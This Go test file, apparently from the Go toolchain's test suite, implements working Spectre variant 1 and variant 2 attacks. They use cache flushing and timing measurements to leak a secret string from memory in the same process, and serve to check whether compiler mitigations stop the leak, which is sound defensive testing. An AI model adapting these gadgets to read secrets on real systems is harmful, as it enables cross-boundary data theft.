// Copyright 2020 The Go Authors. All rights reserved.
// Use of this source code is governed by a BSD-style
// license that can be found in the LICENSE file.

package spectre

import (
	"flag"
	"sort"
	"sync/atomic"
	"testing"
	"unsafe"
)

// asm_amd64.s
func nop()
func cpuid()
func clflush(unsafe.Pointer)
func rdtscp() int64
func features() (cpuid, rdtscp bool)

// Victim program

type victimStruct struct {
	secret      []byte
	pad1        [4]int
	slice1      []byte     // starts on word 7 of struct, so len is in word 8, new cache line
	pad2        [6 + 7]int // cache-line aligned again
	slice2      []int
	pad2b       [6]int // cache-line aligned again
	timingArray [256]struct {
		pad  [1024 - 4]byte
		data int32
	}
	pad3       [1024 - 4]byte
	temp       int32
	pad5       [1024]byte
	slice2data [8]int
	f          uintptr
}

var v *victimStruct

func init() {
	// Allocate dynamically to force 64-byte alignment.
	// A global symbol would only be 32-byte aligned.
	v = new(victimStruct)
	if uintptr(unsafe.Pointer(v))&63 != 0 {
		panic("allocation not 64-byte aligned")
	}
	v.secret = []byte("The Magic Words are Squeamish Gossifrage")
	v.slice1 = []byte{1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16}
	v.slice2 = v.slice2data[:]
	f := nop
	v.f = *(*uintptr)(unsafe.Pointer(&f))
}

// Spectre variant 1. (BCB - Bounds Check Bypass)
// Speculation fetches from v.timingArray even if i is out of bounds in v.slice1[i].

func victim1(i int) {
	if uint(i) < uint(len(v.slice1)) {
		v.temp ^= v.timingArray[v.slice1[i]].data
	}
}

func spectre1(innocent, target int) {
	for j := 31; j >= 0; j-- {
		// Flush the cache line holding the slice len (but not the base pointer).
		// This makes the test in victim1 need to fetch from main memory,
		// increasing the window during which the CPU speculates ahead.
		// The CPUID waits for the CLFLUSH to finish.
		clflush(unsafe.Pointer(uintptr(unsafe.Pointer(&v.slice1)) + 8))
		cpuid()
		mask := (j - 1) >> 8 // 0 on most rounds, -1 on last
		victim1(innocent&^mask | target&mask)
	}
}

// Spectre variant 1 again, with implicit bounds check provided by Go.
// Speculation fetches from v.timingArray even if i is out of bounds in v.slice1[i].

func victim1Implicit(i int) {
	defer func() {
		recover()
	}()
	v.temp ^= v.timingArray[v.slice1[i]].data
}

func spectre1Implicit(innocent, target int) {
	// Same as spectre1 above, calling victim1implicit.
	for j := 31; j >= 0; j-- {
		clflush(unsafe.Pointer(uintptr(unsafe.Pointer(&v.slice1)) + 8))
		cpuid()
		mask := (j - 1) >> 8 // 0 on most rounds, -1 on last
		victim1Implicit(innocent&^mask | target&mask)
	}
}

// Spectre variant 2 victim gadget. (BTI - Branch Target Injection)
// Will speculate that final call is to victimType.Victim instead of attackerType.Victim.

type victimType int

func (i victimType) Victim() {
	victim1(int(i))
}

type attackerType int

func (attackerType) Victim() {}

func spectre2(innocent, target int) {
	list := make([]interface{ Victim() }, 128)
	list[0] = victimType(innocent)
	vi := list[0]
	for i := range list {
		list[i] = vi
	}
	list[len(list)-1] = attackerType(target)

	av := &list[len(list)-1]
	// The 24 here is the offset of the first method in the itab.
	itab := unsafe.Pointer(uintptr(**(**unsafe.Pointer)(unsafe.Pointer(&av))) + 24)

	for _, vi := range list {
		clflush(itab)
		clflush(unsafe.Pointer(uintptr(unsafe.Pointer(&v.slice1)) + 8))
		cpuid()
		vi.Victim()
	}
}

// General attack.

func readbyte(target int, spectre func(int, int)) byte {
	for tries := 0; tries < 10; tries++ {
		var times [256][8]int
		for round := range times[0] {
			// Flush timingArray.
			for j := range times {
				clflush(unsafe.Pointer(&v.timingArray[j].data))
			}

			// Speculate load from timingArray.
			innocent := round % 16
			spectre(innocent, target)

			// Measure access times for vtimingArray.
			// The atomic.LoadInt32 is not for synchronization
			// but instead something that the compiler won't optimize away or move.
			for j := range times {
				pj := (j*167 + 234) & 255 // permuted j to confuse prefetch
				atomic.LoadInt32(&dummy[0])
				addr := &v.timingArray[byte(pj)].data
				t := rdtscp()
				dummy[0] += int32(*addr)
				t = rdtscp() - t
				times[pj][round] = int(t)
			}
		}

		found := 0
		var c byte
		for j := range times {
			_, avg, _ := stats(times[j][:])
			if hitMin/2 <= avg && avg <= 2*hitMax {
				found++
				c = byte(j)
			}
		}
		if found == 1 {
			return c
		}
		if found > 10 {
			return 0
		}
	}
	return 0
}

var leakFixed = flag.Bool("leakfixed", false, "expect leak to be fixed")

func testSpectre(t *testing.T, spectre func(int, int)) {
	if cpuid, rdtscp := features(); !cpuid {
		t.Skip("CPUID not available")
	} else if !rdtscp {
		t.Skip("RDTSCP not available")
	}

	t.Logf("hit %d %d %d vs miss %d %d %d\n", hitMin, hitAvg, hitMax, missMin, missAvg, missMax)
	if missMin/2 < hitMax {
		t.Fatalf("cache misses vs cache hits too close to call")
		return
	}

	offset := int(uintptr(unsafe.Pointer(&v.secret[0])) - uintptr(unsafe.Pointer(&v.slice1[0])))
	// fmt.Printf("offset %d\n", offset)
	buf := make([]byte, 40)
	for i := 0; i < 40; i++ {
		buf[i] = readbyte(offset+i, spectre)
	}
	found := string(buf)

	// Don't insist on the whole string, but expect most of it.
	leaked := 0
	for i := range found {
		if found[i] == v.secret[i] {
			leaked++
		}
	}
	if !*leakFixed && leaked < len(found)/2 {
		t.Fatalf("expected leak; found only %q", found)
	}
	if *leakFixed && leaked > 0 {
		t.Fatalf("expected no leak; found %q", found)
	}
}

func TestSpectre1(t *testing.T) {
	testSpectre(t, spectre1)
}

func TestSpectre1Implicit(t *testing.T) {
	testSpectre(t, spectre1Implicit)
}

func TestSpectre2(t *testing.T) {
	testSpectre(t, spectre2)
}

var (
	hitMin, hitAvg, hitMax    = measure(-1, 500)
	missMin, missAvg, missMax = measure(500, 500)
)

var dummy [1024]int32

func measure(flush, probe int) (min, avg, max int) {
	var times [100]int
	for i := range times {
		if flush >= 0 {
			clflush(unsafe.Pointer(&dummy[flush]))
		}
		// The atomic.LoadInt32 is not for synchronization
		// but instead something that the compiler won't optimize away or move.
		t := rdtscp()
		dummy[0] += atomic.LoadInt32(&dummy[probe])
		times[i] = int(rdtscp() - t)
	}
	return stats(times[:])
}

func stats(x []int) (min, avg, max int) {
	// Discard outliers.
	sort.Ints(x)
	q1 := x[len(x)/4]
	q3 := x[len(x)*3/4]
	lo := q1 - (q3-q1)*3/2
	hi := q3 + (q3-q1)*3/2
	i := 0
	for i < len(x) && x[i] < lo {
		i++
	}
	j := len(x)
	for j-1 > i && x[j-1] > hi {
		j--
	}
	if i < j {
		x = x[i:j]
	}

	min = x[0]
	max = x[len(x)-1]

	avg = 0
	for _, v := range x {
		avg += v
	}
	avg /= len(x)
	return min, avg, max
}
